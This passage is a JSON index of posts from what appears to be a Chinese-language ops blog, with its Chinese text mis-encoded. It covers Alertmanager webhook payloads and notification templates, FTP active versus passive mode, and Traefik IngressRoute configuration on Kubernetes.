\"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-master\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-master\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-master é«˜äº5,å½“å‰å€¼:0.09\", \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"2020-12-30T06:07:49.455639638Z\", \"generatorURL\":\"http://119.3.44.21:30002/graph?g0.expr=node_load5+%3E+5\u0026amp;g0.tab=1\" }, { \"status\":\"resolved\", \"labels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node1\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node1\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node1 é«˜äº5,å½“å‰å€¼:0.61\", \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"2020-12-30T06:07:49.455639638Z\", \"generatorURL\":\"http://119.3.44.21:30002/graph?g0.expr=node_load5+%3E+5\u0026amp;g0.tab=1\" }, { \"status\":\"resolved\", \"labels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node2\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node2\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node2 é«˜äº5,å½“å‰å€¼:0.4\", \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"2020-12-30T06:07:49.455639638Z\", \"generatorURL\":\"http://119.3.44.21:30002/graph?g0.expr=node_load5+%3E+5\u0026amp;g0.tab=1\" } ], \"groupLabels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\" }, \"commonLabels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"severity\":\"critical\", \"team\":\"ops\" }, \"commonAnnotations\":{ \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"externalURL\":\"http://alertmanager-57fffcb99c-kjhcj:9093\", \"version\":\"4\", \"groupKey\":\"{}/{severity=\\\"critical\\\"}:{alertname=\\\"load5è´Ÿè½½é«˜äº5\\\"}\" } ","date":"2020-12-30 13:08","objectID":"/post/2169/:0:2","tags":["prometheus","alertmanager"],"title":"alertmanager-webhookå‘é€å‘Šè­¦\u0026amp;æ¢å¤ä¿¡æ¯çš„è¯·æ±‚ä½“","uri":"/post/2169/"},{"categories":["ç›‘æ§"],"content":"ä¸€ã€å‘Šè­¦æ¨¡æ¿ alertmanageræ˜¯å¯ä»¥è‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿çš„ã€‚ æ³¨æ„é’‰é’‰éœ€è¦éƒ¨ç½²prometheus-webhook-dingtalkï¼Œè¿™ä¸ªä¹Ÿæ˜¯æ”¯æŒæ¨¡æ¿çš„ï¼Œä½†æ˜¯æ¨¡æ¿è¦å†™åœ¨prometheus-webhook-dingtalké‡Œï¼Œè€Œä¸æ˜¯alertmanager é¡¹ç›®é“¾æ¥https://github.com/timonwong/prometheus-webhook-dingtalk é€šè¿‡é…ç½®templateså‚æ•°,æŒ‡å®šæ¨¡æ¿ä½ç½®ã€‚è¯¦ç»†å¯ä»¥çœ‹æˆ‘ä¸Šä¸€ç¯‡æ–‡ç«  ä¸‹é¢æ˜¯ä¸€ä¸ªæ¨¡æ¿ç¤ºä¾‹(ç½‘ä¸Šcopyçš„): vim /etc/alertmanager/template/wechat.tmpl {{- define \"wechat.tmpl\" }} {{- range $i, $alert := .Alerts.Firing -}} [æŠ¥è­¦é¡¹]:{{ index $alert.Labels \"alertname\" }} [å®ä¾‹]:{{ index $alert.Labels \"instance\" }} [job]:{{ index $alert.Labels \"job\" }} [æŠ¥è­¦å†…å®¹]:{{ index $alert.Annotations \"summary\" }} [å¼€å§‹æ—¶é—´]:{{ $alert.StartsAt.Format \"2006-01-02 15:04:05\" }} ==================== {{- end }} {{- end }} define: å®šä¹‰æ¨¡æ¿åç§° range: å¾ªç¯éå† index: é€šè¿‡keyå–å€¼ ","date":"2020-12-30 10:10","objectID":"/post/2168/:1:0","tags":["prometheus","alertmanager"],"title":"alertmanagerè‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿(äº”)","uri":"/post/2168/"},{"categories":["ç›‘æ§"],"content":"äºŒã€æ•°æ®ç»“æ„ä»‹ç» ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:0","tags":["prometheus","alertmanager"],"title":"alertmanagerè‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿(äº”)","uri":"/post/2168/"},{"categories":["ç›‘æ§"],"content":"1.Data .Receiver: æ¥æ”¶å™¨çš„åç§° .Status : å¦‚æœå­˜åœ¨å‘Šè­¦,åˆ™ä¸ºfiring,å¦åˆ™resolved(æ¢å¤)ã€‚ .Alerts : æ‰€æœ‰å‘Šè­¦å¯¹è±¡(alertå¯¹è±¡)çš„åˆ—è¡¨ã€‚(å¦å¤–ä»–è¿˜æä¾›äº†ä¸¤ä¸ªå‡½æ•°ç”¨äºè¿‡æ»¤å‘Šè­¦å’Œæ¢å¤åˆ—è¡¨Alerts.Firing:ä»£è¡¨å‘Šè­¦åˆ—è¡¨,Alerts.Resolved:ä»£è¡¨æ¢å¤åˆ—è¡¨),å‘Šè­¦å¯¹è±¡çš„æ•°æ®ç»“æ„å¯ä»¥çœ‹ä¸‹é¢alertéƒ¨åˆ† .GroupLabels: å‘Šè­¦çš„åˆ†ç»„æ ‡ç­¾(æ²¡çŒœé”™åº”è¯¥æ˜¯å¯¹åº”é…ç½®æ–‡ä»¶çš„group_by) .CommonLabels: æ‰€æœ‰å‘Šè­¦å…±æœ‰çš„æ ‡ç­¾ .CommonAnnotations: æ‰€æœ‰å‘Šè­¦å…±æœ‰çš„æ³¨è§£ .ExternalURL: å‘Šè­¦å¯¹åº”çš„alertmanageré“¾æ¥åœ°å€ ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:1","tags":["prometheus","alertmanager"],"title":"alertmanagerè‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿(äº”)","uri":"/post/2168/"},{"categories":["ç›‘æ§"],"content":"2.Alert: çœ‹è¿™ä¸ªä¹‹å‰å¯ä»¥å…ˆäº†è§£ä¸Šé¢çš„Alerts Status: å½“å‰è¿™ä¸€æ¡æŠ¥è­¦çš„çŠ¶æ€ã€‚firing(å‘Šè­¦)æˆ–resolved(æ¢å¤) Labels: å½“å‰è¿™ä¸€æ¡æŠ¥è­¦çš„æ ‡ç­¾ Annotations: å½“å‰è¿™ä¸€æ¡æŠ¥è­¦çš„æ³¨è§£ StartsAt: å½“å‰è¿™ä¸€æ¡æŠ¥è­¦çš„å¼€å§‹æ—¶é—´ EndsAt: å½“å‰è¿™ä¸€æ¡æŠ¥è­¦çš„ç»“æŸæ—¶é—´ GeneratorURL: å‘Šè­¦å¯¹åº”çš„alertmanageré“¾æ¥åœ°å€ ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:2","tags":["prometheus","alertmanager"],"title":"alertmanagerè‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿(äº”)","uri":"/post/2168/"},{"categories":["ç›‘æ§"],"content":"3. kvæ•°æ®çš„ä¸€äº›å†…ç½®æ–¹æ³• kvæ•°æ®ç›¸å½“äºpythoné‡Œçš„å­—å…¸ï¼Œåœ¨æ¨¡æ¿ä¸­æä¾›äº†ä¸€äº›æ–¹æ³•å¯ä»¥æ“ä½œkvæ•°æ® SortedPairs: æ’åº Remove : åˆ é™¤ä¸€ä¸ªkey Names: è¿”å›æ ‡ç­¾é›†ä¸­æ ‡ç­¾åçš„åç§°åˆ—è¡¨ã€‚ Values: è¿”å›æ ‡ç­¾é›†ä¸­æ ‡ç­¾åçš„å€¼åˆ—è¡¨ã€‚ ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:3","tags":["prometheus","alertmanager"],"title":"alertmanagerè‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿(äº”)","uri":"/post/2168/"},{"categories":["ç›‘æ§"],"content":"4.goæ¨¡æ¿å¸¸ç”¨å†…ç½®å‡½æ•° title: å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºé¦–å­—æ¯å¤§å†™çš„æ ‡é¢˜ toUpper: å­—æ¯è½¬æ¢æˆå¤§å†™ toLower: å­—æ¯è½¬æ¢æˆå°å†™ match: ä½¿ç”¨æ­£åˆ™åŒ¹é…å­—ç¬¦ä¸² reReplaceAll: ä½¿ç”¨æ­£åˆ™æ›¿æ¢å­—ç¬¦ä¸² join: è¿æ¥å­—ç¬¦ä¸²ç”¨æ³•{{ .CommonLabels.SortedPairs.Values | join \",\" }} safeHtml: å°†å­—ç¬¦ä¸²æ ‡è®°ä¸ºä¸éœ€è¦è‡ªåŠ¨è½¬ä¹‰çš„HTML è¯¦ç»†çš„æ•°æ®ç±»å‹ä»‹ç»:https://prometheus.io/docs/alerting/latest/notifications/ ä¸‹é¢ä¸çŸ¥é“æ˜¯å“ªä¸ªå¤§ä½¬å†™çš„,å¯ä»¥å‚è€ƒä¸€ä¸‹: {{ define \"__subject\" }}[{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}] {{ .GroupLabels.SortedPairs.Values | join \" \" }} {{ if gt (len .CommonLabels) (len .GroupLabels) }}({{ with .CommonLabels.Remove .GroupLabels.Names }}{{ .Values | join \" \" }}{{ end }}){{ end }}{{ end }} {{ define \"__alertmanagerURL\" }}{{ .ExternalURL }}/#/alerts?receiver={{ .Receiver }}{{ end }} {{ define \"__text_alert_list\" }}{{ range . }} **Labels** {{ range .Labels.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **Annotations** {{ range .Annotations.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **Source:** [{{ .GeneratorURL }}]({{ .GeneratorURL }}) {{ end }}{{ end }} {{ define \"default.__text_alert_list\" }}{{ range . }} --- **å‘Šè­¦çº§åˆ«:** {{ .Labels.severity | upper }} **è¿è¥å›¢é˜Ÿ:** {{ .Labels.team | upper }} **è§¦å‘æ—¶é—´:** {{ dateInZone \"2006.01.02 15:04:05\" (.StartsAt) \"Asia/Shanghai\" }} **äº‹ä»¶ä¿¡æ¯:** {{ range .Annotations.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **äº‹ä»¶æ ‡ç­¾:** {{ range .Labels.SortedPairs }}{{ if and (ne (.Name) \"severity\") (ne (.Name) \"summary\") (ne (.Name) \"team\") }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }}{{ end }} {{ end }} {{ end }} {{ define \"default.__text_alertresovle_list\" }}{{ range . }} --- **å‘Šè­¦çº§åˆ«:** {{ .Labels.severity | upper }} **è¿è¥å›¢é˜Ÿ:** {{ .Labels.team | upper }} **è§¦å‘æ—¶é—´:** {{ dateInZone \"2006.01.02 15:04:05\" (.StartsAt) \"Asia/Shanghai\" }} **ç»“æŸæ—¶é—´:** {{ dateInZone \"2006.01.02 15:04:05\" (.EndsAt) \"Asia/Shanghai\" }} **äº‹ä»¶ä¿¡æ¯:** {{ range .Annotations.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **äº‹ä»¶æ ‡ç­¾:** {{ range .Labels.SortedPairs }}{{ if and (ne (.Name) \"severity\") (ne (.Name) \"summary\") (ne (.Name) \"team\") }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }}{{ end }} {{ end }} {{ end }} {{/* Default */}} {{ define \"default.title\" }}{{ template \"__subject\" . }}{{ end }} {{ define \"default.content\" }}#### \\[{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}\\] **[{{ index .GroupLabels \"alertname\" }}]({{ template \"__alertmanagerURL\" . }})** {{ if gt (len .Alerts.Firing) 0 -}} ![è­¦æŠ¥ å›¾æ ‡](https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3626076420,1196179712\u0026fm=15\u0026gp=0.jpg) **====ä¾¦æµ‹åˆ°æ•…éšœ====** {{ template \"default.__text_alert_list\" .Alerts.Firing }} {{- end }} {{ if gt (len .Alerts.Resolved) 0 -}} {{ template \"default.__text_alertresovle_list\" .Alerts.Resolved }} {{- end }} {{- end }} {{/* Legacy */}} {{ define \"legacy.title\" }}{{ template \"__subject\" . }}{{ end }} {{ define \"legacy.content\" }}#### \\[{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}\\] **[{{ index .GroupLabels \"alertname\" }}]({{ template \"__alertmanagerURL\" . }})** {{ template \"__text_alert_list\" .Alerts.Firing }} {{- end }} {{/* Following names for compatibility */}} {{ define \"ding.link.title\" }}{{ template \"default.title\" . }}{{ end }} {{ define \"ding.link.content\" }}{{ template \"default.content\" . }}{{ end }} ä¸‹é¢æ˜¯æˆ‘å†™çš„ä¸€ä¸ªå°ä¾‹å­: {{ define \"__subject\" }} [{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}] {{ end }} {{ define \"__alert_list\" }}{{ range . }} --- **å‘Šè­¦åç§°**: {{ index .Annotations \"summary\" }} **å‘Šè­¦çº§åˆ«**: {{ .Labels.severity }} **å‘Šè­¦ä¸»æœº**: {{ .Labels.instance }} **å‘Šè­¦ä¿¡æ¯**: {{ index .Annotations \"description\" }} **ç»´æŠ¤å›¢é˜Ÿ**: {{ .Labels.team | upper }} **å‘Šè­¦æ—¶é—´**: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} {{ end }}{{ end }} {{ define \"__resolved_list\" }}{{ range . }} --- **å‘Šè­¦åç§°**: {{ index .Annotations \"summary\" }} **å‘Šè­¦çº§åˆ«**: {{ .Labels.severity }} **å‘Šè­¦ä¸»æœº**: {{ .Labels.instance }} **å‘Šè­¦ä¿¡æ¯**: {{ index .Annotations \"d","date":"2020-12-30 10:10","objectID":"/post/2168/:2:4","tags":["prometheus","alertmanager"],"title":"alertmanagerè‡ªå®šä¹‰å‘Šè­¦æ¨¡æ¿(äº”)","uri":"/post/2168/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åŸæ–‡:https://www.huaweicloud.com/zhishi/2006281029.html ","date":"2020-12-29 09:38","objectID":"/post/2160/:0:0","tags":["vsftpd","ftp"],"title":"ftpä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼çš„åŒºåˆ«","uri":"/post/2160/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1ã€ä¸»åŠ¨æ¨¡å¼ å®¢æˆ·ç«¯ä»ä¸€ä¸ªä»»æ„çš„éç‰¹æƒç«¯å£Nï¼ˆN\u003e1023ï¼‰è¿æ¥åˆ°FTPæœåŠ¡å™¨çš„21ç«¯å£ã€‚ç„¶åå®¢æˆ·ç«¯å¼€å§‹ç›‘å¬N+1ï¼ˆå¦‚ä¸‹å›¾çš„1027ç«¯å£ï¼‰ï¼Œå¹¶å‘é€FTPå‘½ä»¤â€œport N+1â€åˆ°FTPæœåŠ¡å™¨ã€‚æ¥ç€æœåŠ¡å™¨ä¼šä»å®ƒè‡ªå·±çš„æ•°æ®ç«¯å£ï¼ˆ20ï¼‰è¿æ¥åˆ°å®¢æˆ·ç«¯æŒ‡å®šçš„æ•°æ®ç«¯å£ï¼ˆN+1ï¼‰ã€‚ ç”¨æ›´é€šä¿—çš„è¯­è¨€æ¥ç†è§£è¿™ä¸ªäº¤äº’è¿‡ç¨‹ï¼š 1ï¼‰ å®¢æˆ·ç«¯ç”¨ä¸€ä¸ªå¤§äº1024çš„ç«¯å£Nä¸FTPæœåŠ¡å™¨çš„21ç«¯å£å»ºç«‹ä¸€ä¸ªæ§åˆ¶é€šé“ï¼Œå‘é€ä¸€æ¡å‘½ä»¤å‘Šè¯‰FTPæœåŠ¡ç«¯ï¼ˆå³é€šå¸¸è¯´çš„PORTå‘½ä»¤ï¼‰ï¼Œæˆ‘çš„æ•°æ®é€šé“çš„é€šä¿¡åœ°å€æ˜¯IP1ï¼ˆæœ¬æœºç½‘å¡IPï¼‰ï¼Œæ•°æ®é€šé“çš„ç«¯å£N+1ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚åå›å¤ACKç¡®è®¤ã€‚ 2ï¼‰ æœåŠ¡ç«¯ç¡®è®¤åï¼Œç”¨æºç«¯å£20ä¸»åŠ¨ä¸å®¢æˆ·ç«¯IP1:N+1å»ºç«‹è¿æ¥ï¼Œè¿›è¡Œæ•°æ®é€šä¿¡ã€‚ 71329-og9czewmrpo.png ","date":"2020-12-29 09:38","objectID":"/post/2160/:1:0","tags":["vsftpd","ftp"],"title":"ftpä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼çš„åŒºåˆ«","uri":"/post/2160/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2ã€è¢«åŠ¨æ¨¡å¼ å½“å¼€å¯ä¸€ä¸ªFTPè¿æ¥æ—¶ï¼Œå®¢æˆ·ç«¯æ‰“å¼€ä¸¤ä¸ªä»»æ„çš„éç‰¹æƒæœ¬åœ°ç«¯å£N\u003e1024å’ŒN+1ï¼ˆåˆ†åˆ«å¦‚ä¸‹å›¾çš„1026ç«¯å£å’Œ1027ç«¯å£ï¼‰ã€‚ç¬¬ä¸€ä¸ªç«¯å£è¿æ¥æœåŠ¡å™¨çš„21ç«¯å£ï¼Œå®¢æˆ·ç«¯æäº¤PASVå‘½ä»¤ç»™æœåŠ¡ç«¯ï¼Œè¿™æ ·åšçš„ç»“æœæ˜¯æœåŠ¡å™¨ä¼šå¼€å¯ä¸€ä¸ªä»»æ„çš„éç‰¹æƒç«¯å£ï¼ˆP\u003e1024ï¼‰ï¼Œå¹¶å‘é€PORT Pï¼ˆå¦‚ä¸‹å›¾2024ï¼‰å‘½ä»¤ç»™å®¢æˆ·ç«¯ã€‚ç„¶åå®¢æˆ·ç«¯å‘èµ·ä»æœ¬åœ°ç«¯å£N+1åˆ°æœåŠ¡å™¨çš„ç«¯å£Pçš„è¿æ¥ç”¨æ¥ä¼ é€æ•°æ®ã€‚ ç”¨æ›´é€šä¿—çš„è¯­è¨€æ¥ç†è§£è¿™ä¸ªäº¤äº’è¿‡ç¨‹ï¼š 1ï¼‰ å®¢æˆ·ç«¯ä½¿ç”¨æºç«¯å£Nä¸FTPæœåŠ¡ç«¯å»ºç«‹ä¸€ä¸ªæ§åˆ¶é€šé“ï¼Œå‘é€ä¸€æ¡å‘½ä»¤å‘Šè¯‰æœåŠ¡ç«¯ï¼ˆå³é€šå¸¸è¯´çš„PASVå‘½ä»¤ï¼‰ï¼Œæˆ‘å°†ä½¿ç”¨è¢«åŠ¨æ¨¡å¼ä¸ä½ é€šä¿¡ã€‚æœåŠ¡ç«¯æ”¶è¯·æ±‚åï¼Œä¼šå‘ŠçŸ¥å®¢æˆ·ç«¯æˆ‘çš„IPæ˜¯IP2ï¼ˆé»˜è®¤ä¸ºä¸»æœºç½‘å¡IPï¼‰å’Œç›‘å¬ç«¯å£Pï¼Œä½ å¯ä»¥å’Œæˆ‘çš„è¿™ä¸ªIPå’Œç«¯å£é€šä¿¡ã€‚ 2ï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°1ï¼‰ä¸­çš„ä¿¡æ¯åï¼Œä½¿ç”¨æºç«¯å£N+1ï¼Œä¸æœåŠ¡ç«¯IP2:På»ºç«‹è¿æ¥ï¼Œè¿›è¡Œæ•°æ®é€šä¿¡ã€‚ 27657-e4fu5a5zgeh.png ","date":"2020-12-29 09:38","objectID":"/post/2160/:2:0","tags":["vsftpd","ftp"],"title":"ftpä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼çš„åŒºåˆ«","uri":"/post/2160/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"IngressRouteæ˜¯traefikç¼–å†™çš„ä¸€ä¸ªè‡ªå®šä¹‰èµ„æº(CRD),å¯ä»¥æ›´å¥½çš„é…ç½®traefikæ‰€éœ€çš„è·¯ç”±ä¿¡æ¯ https://doc.traefik.io/traefik/reference/dynamic-configuration/kubernetes-crd/#resources ","date":"2020-12-28 15:53","objectID":"/post/2159/:0:0","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸€ã€ä½¿ç”¨helmå®‰è£…traefik 1.æ·»åŠ traefikä»“åº“ helm repo add traefik https://helm.traefik.io/traefik helm repo update 2.å®‰è£…traefik kubectl create ns traefik-v2 helm install --namespace=traefik-v2 traefik traefik/traefik 3.æš´éœ²traefikçš„dashboard ç«¯å£è¯´æ˜: 9000æ˜¯dashboard 8000æ˜¯httpå…¥å£ 8443æ˜¯httpså…¥å£ kubectl port-forward --address=0.0.0.0 -n traefik-v2 $(kubectl get pods -n traefik-v2 --selector \"app.kubernetes.io/name=traefik\" --output=name) 9000:9000 é€šè¿‡masterèŠ‚ç‚¹IP:9000/dashboard/è®¿é—®traefikä»ªè¡¨ç›˜ ä»¥ä¸Šå®‰è£…æ–¹å¼ä»…ä¸ºå­¦ä¹ ä½¿ç”¨. 58456-zpguelkyx.png ","date":"2020-12-28 15:53","objectID":"/post/2159/:1:0","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"äºŒã€traefik IngressRouteèµ„æºé…ç½® ä¸‹é¢éƒ¨ç½²ä¸€ä¸ªnginxåº”ç”¨ apiVersion: apps/v1 kind: Deployment metadata: name: nginx-test namespace: kube-ops spec: selector: matchLabels: app: nginx test: \"true\" template: metadata: labels: app: nginx test: \"true\" spec: containers: - name: nginx-test ports: - name: http containerPort: 80 image: nginx:1.17.10 --- apiVersion: v1 kind: Service metadata: name: nginx-test namespace: kube-ops spec: selector: app: nginx test: \"true\" type: ClusterIP ports: - name: web port: 80 targetPort: http è®©æˆ‘ä»¬é€šè¿‡IngressRouteæ¥é…ç½®ä¸€ä¸ªè§„åˆ™ https://doc.traefik.io/traefik/routing/providers/kubernetes-crd/#kind-ingressroute apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: nginx-test namespace: kube-ops spec: entryPoints: # ç›‘å¬æŒ‡å®šå…¥å£ç‚¹ä¸ºçš„æµé‡ã€‚è¿™é‡Œçš„webå°±æ˜¯traefiké™æ€é…ç½®(å¯åŠ¨å‚æ•°)ä¸­çš„ --entryPoints.web.address=:8000,é€šè¿‡ä»ªè¡¨ç›˜ä¹Ÿå¯ä»¥çœ‹åˆ° - web routes: - kind: Rule match: Host(`test.com`) services: - name: nginx-test port: 80 å¯ä»¥çœ‹åˆ°æˆ‘é—¨åˆšæ‰é…ç½®çš„è§„åˆ™å·²ç»ç”Ÿæ•ˆäº†ã€‚ 88637-g703qcu4v6.png ç°åœ¨å°†å…¥å£ç‚¹webæš´éœ²å‡ºæ¥ï¼Œé€šè¿‡9001ç«¯å£ã€‚ kubectl port-forward --address=0.0.0.0 -n traefik-v2 $(kubectl get pods -n traefik-v2 --selector \"app.kubernetes.io/name=traefik\" --output=name) 9001:8000 åœ¨æœ¬åœ°åšhostsè§£æ x.x.x.x test.com ç°åœ¨æˆ‘ä»¬æ‰“å¼€test.com:9001å¯ä»¥çœ‹åˆ°nginxå·²ç»æ­£å¸¸è®¿é—® 40593-17h09vnq5qx.png ","date":"2020-12-28 15:53","objectID":"/post/2159/:2:0","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸‰ã€httpsé…ç½® ç”Ÿæˆè¯ä¹¦secret kubectl create secret tls nginx-test --cert=tls.crt --key=tls.key ä¿®æ”¹ä¹‹å‰çš„IngressRoute apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: nginx-test namespace: kube-ops spec: entryPoints: # æŒ‡å®šå…¥å£ç‚¹ä¸ºwebã€‚è¿™é‡Œçš„webå°±æ˜¯traefiké™æ€é…ç½®(å¯åŠ¨å‚æ•°)ä¸­çš„ --entryPoints.web.address=:8000,é€šè¿‡ä»ªè¡¨ç›˜ä¹Ÿå¯ä»¥çœ‹åˆ° - web routes: - kind: Rule match: Host(`test.com`) # åŒ¹é…è§„åˆ™,ç¬¬ä¸‰éƒ¨åˆ†è¯´æ˜ services: - name: nginx-test port: 80 tls: secretName: nginx-test å› ä¸ºä¸æ˜¯æ­£å¸¸çš„è¯ä¹¦,æ‰€ä»¥è®¿é—®è¿‡ä¸å» 54073-f0d04jeun5l.png ","date":"2020-12-28 15:53","objectID":"/post/2159/:3:0","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"å››ã€ingressrouteé…ç½®è¯¦è§£ apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: foo namespace: bar spec: # å…¥å£ç‚¹åˆ—è¡¨ entryPoints: - foo # å®šä¹‰è·¯ç”±é…ç½® routes: # kindç›®å‰åªæ”¯æŒRule - kind: Rule # è·¯ç”±åŒ¹é…è§„åˆ™ match: Host(`test.example.com`) # å½“å‰è§„åˆ™çš„ä¼˜å…ˆçº§,ä¼˜å…ˆçº§é«˜åˆ™ä¼˜å…ˆåŒ¹é…,å¯ä»¥ç”¨æ¥è§£å†³è·¯ç”±å†²çª priority: 10 # ä½¿ç”¨ä¸­é—´ä»¶ middlewares: # ä¸­é—´ä»¶åç§° - name: middleware1 # ä¸­é—´ä»¶æ‰€åœ¨çš„k8s namespace namespace: default # å¼•ç”¨service services: # Serviceæˆ–è€…TraefikService - kind: Service name: foo namespace: default # è½¬å‘å®¢æˆ·ç«¯çš„header,é»˜è®¤true passHostHeader: true # serviceçš„ç«¯å£å·ï¼Œä¹Ÿå¯ä»¥å†™åç§° port: 80 # å®šä¹‰traefikå¦‚ä½•å“åº”æœåŠ¡ç«¯çš„è¯·æ±‚ç»™å®¢æˆ·ç«¯ responseForwarding: # å½“æ¥æ”¶åˆ°æ¥è‡ªåç«¯æœåŠ¡çš„å“åº”1mså,å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯,ä¾‹å¦‚é˜²æ­¢åˆ†å—ä¼ è¾“(Transfer-Encoding: chunked)é¢‘ç¹å‘é€å¤§é‡å°æ•°æ®ã€å‘é€å°æ–‡ä»¶ç­‰æƒ…å†µä¸‹ä¼šç”¨åˆ° # å¦‚æœæ˜¯æµå¼å“åº”é‚£ä¹ˆè¿™ä¸ªå‚æ•°ä¸ç”Ÿæ•ˆ flushInterval: 1ms # è¯·æ±‚åç«¯æœåŠ¡å™¨ä½¿ç”¨httpæˆ–https scheme: https # å¼•ç”¨ServersTransportèµ„æº,ä»…k8s serviceæ”¯æŒã€‚ ServersTransportç”¨äºå…¨å±€é…ç½® Traefik å’Œåç«¯ä¹‹é—´çš„è¿æ¥ # ServersTransporté…ç½®è¯´æ˜é¡¹ https://doc.traefik.io/traefik/routing/overview/#transport-configuration # è‡ªå®šä¹‰ServersTransportèµ„æº https://doc.traefik.io/traefik/routing/providers/kubernetes-crd/#kind-serverstransport serversTransport: transport # å¯ç”¨ç²˜æ€§ä¼šè¯,å°†è¯·æ±‚è½¬å‘åˆ°åŒä¸€ä¸ªpodä¸­ sticky: # ç›®å‰ä»…æ”¯æŒcookie # ä¼šåœ¨åˆå§‹å“åº”ä¸­æ·»åŠ  Set-Cookie æ ‡å¤´ï¼Œè®©å®¢æˆ·ç«¯çŸ¥é“æ˜¯å“ªä¸ªæœåŠ¡å™¨å¤„ç†çš„ç¬¬ä¸€ä¸ªå“åº”ã€‚åœ¨åç»­è¯·æ±‚ä¸­ï¼Œä¸ºäº†ä¿æŒä¸åŒä¸€æœåŠ¡å™¨çš„ä¼šè¯æœ‰æ•ˆï¼Œå®¢æˆ·ç«¯åº”è¯¥å‘é€å¸¦æœ‰å€¼é›†çš„ cookieã€‚ cookie: name: cookie # httpOnly ä¸å…è®¸ä½¿ç”¨javascriptè·å–cookie httpOnly: true # secure ä»…åº”é€šè¿‡ HTTPS è¿æ¥ä¼ è¾“ secure: true # æ§åˆ¶æµè§ˆå™¨æ˜¯å¦åº”è¯¥å°† Cookie å‘é€åˆ°è·¨ç«™ç‚¹è¯·æ±‚ä¸­, é˜²æ­¢csrfæ”»å‡»ã€‚ # 